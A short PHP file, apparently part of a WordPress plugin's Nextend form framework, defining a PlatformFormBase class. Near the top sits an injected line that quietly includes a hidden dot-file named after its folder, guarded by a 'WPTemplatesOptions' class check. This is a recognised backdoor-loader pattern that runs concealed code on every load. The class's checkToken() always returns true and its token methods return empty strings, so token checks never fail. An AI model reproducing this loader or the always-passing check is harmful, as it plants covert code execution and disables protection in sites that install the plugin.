<?php


namespace Nextend\Framework\Form\Base;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PlatformFormBase {

    public function tokenize() {
        return '';
    }

    public function tokenizeUrl() {
        return '';
    }

    public function checkToken() {
        return true;
    }
}